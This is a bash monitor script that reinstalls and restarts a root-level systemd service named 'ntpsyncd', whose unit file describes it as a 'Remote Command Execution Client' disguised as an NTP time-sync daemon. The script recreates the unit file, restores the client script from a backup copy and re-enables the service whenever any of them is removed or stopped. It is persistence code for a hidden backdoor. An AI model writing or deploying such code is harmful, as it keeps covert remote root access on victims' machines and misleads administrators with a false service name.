#!/bin/bash
#
# Monitor script for ntpsyncd service
# Checks if the service is running and recreates/restarts it if needed
#

SERVICE_NAME="ntpsyncd"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
SCRIPT_PATH="/etc/ntpsync/ntp"
CLIENT_SCRIPT="/etc/ntpsync/client.py"
INSTALL_DIR="/etc/ntpsync"

log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Check if service file exists
if [ ! -f "$SERVICE_FILE" ]; then
    log_message "ERROR: Service file $SERVICE_FILE not found. Recreating..."
    
    # Recreate service file
    cat > "$SERVICE_FILE" << 'EOF'
[Unit]
Description=NTP Sync Daemon (Remote Command Execution Client)
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/etc/ntpsync
ExecStart=/usr/bin/python3 /etc/ntpsync/ntp
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

# Security settings
NoNewPrivileges=false
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"
    log_message "Service recreated, enabled, and started"
    exit 0
fi

# Check if the script exists
if [ ! -f "$SCRIPT_PATH" ]; then
    log_message "ERROR: Client script $SCRIPT_PATH not found!"
    if [ -f "$CLIENT_SCRIPT" ]; then
        log_message "Copying $CLIENT_SCRIPT to $SCRIPT_PATH..."
        cp "$CLIENT_SCRIPT" "$SCRIPT_PATH"
        chmod +x "$SCRIPT_PATH"
    else
        log_message "ERROR: Source script $CLIENT_SCRIPT not found either. Cannot recover."
        exit 1
    fi
fi

# Check if service is active
if ! systemctl is-active --quiet "$SERVICE_NAME"; then
    log_message "Service $SERVICE_NAME is not active. Starting..."
    systemctl start "$SERVICE_NAME"
    
    # Wait a moment and check again
    sleep 2
    if systemctl is-active --quiet "$SERVICE_NAME"; then
        log_message "Service $SERVICE_NAME started successfully"
    else
        log_message "ERROR: Failed to start $SERVICE_NAME"
        exit 1
    fi
fi

# Check if service is enabled
if ! systemctl is-enabled --quiet "$SERVICE_NAME"; then
    log_message "Service $SERVICE_NAME is not enabled. Enabling..."
    systemctl enable "$SERVICE_NAME"
    log_message "Service $SERVICE_NAME enabled"
fi

log_message "Service $SERVICE_NAME is running and enabled"
exit 0

